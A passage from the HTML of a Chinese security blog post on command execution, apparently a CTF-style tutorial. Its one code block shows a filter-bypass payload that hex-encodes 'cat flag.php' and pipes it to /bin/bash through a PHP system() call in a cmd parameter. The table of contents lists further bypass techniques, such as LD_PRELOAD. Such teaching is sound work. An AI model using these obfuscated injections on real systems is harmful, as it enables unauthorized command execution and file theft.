+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</span></span><br><span class="line"><span class="comment"># printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; ---&gt; 输出为cat flag.php</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 命令执行</li>
+        <li><strong>作者:</strong> Chiexf</li>
+        <li><strong>创建于:</strong> 2023-08-23 00:00:00</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-19 15:10:43
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2023/08/23/Web安全/命令执行/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">#命令执行</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/08/26/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">SQL注入</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/08/23/Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHP反序列化</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">命令执行</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="nav-text">0x01 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E5%8E%9F%E7%90%86"><span class="nav-text">0x02 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-text">0x03 系统命令函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#system"><span class="nav-text">system</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passthru"><span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell-exec"><span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-text">反引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#popen"><span class="nav-text">popen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proc-open"><span class="nav-text">proc_open</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pcntl-php"><span class="nav-text">pcntl.php</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="nav-text">0x04 操作系统链接符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-text">0x05  绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">过滤命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="nav-text">LD_PRELOAD绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">空格绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-text">文件名过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-text">文件读取命令绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">示例</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Chiexf</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
